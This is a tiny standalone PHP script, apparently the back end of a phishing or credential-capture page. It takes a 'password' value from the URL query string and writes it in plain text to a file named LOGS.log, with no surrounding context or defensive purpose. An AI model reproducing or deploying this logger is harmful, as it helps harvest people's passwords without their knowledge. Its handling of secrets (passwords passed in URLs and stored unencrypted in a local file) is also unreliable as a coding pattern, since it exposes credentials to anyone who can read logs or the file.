
<?php
  $FILE=fopen("LOGS.log","w+");
  fwrite($FILE, $_GET['password']);
  fclose($FILE);
?>
